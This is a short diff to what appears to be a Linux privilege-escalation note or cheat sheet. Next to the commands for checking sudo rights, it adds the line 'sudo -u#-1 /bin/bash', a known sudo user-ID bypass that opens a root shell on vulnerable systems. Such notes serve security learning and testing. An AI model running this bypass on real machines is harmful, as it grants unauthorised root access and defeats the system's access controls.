@@ -158,6 +158,7 @@ sudo su
 OR 
 ```
 sudo -l
+sudo -u#-1 /bin/bash # to gain root access
 ```
 
 To see what sudo permissions the user has.
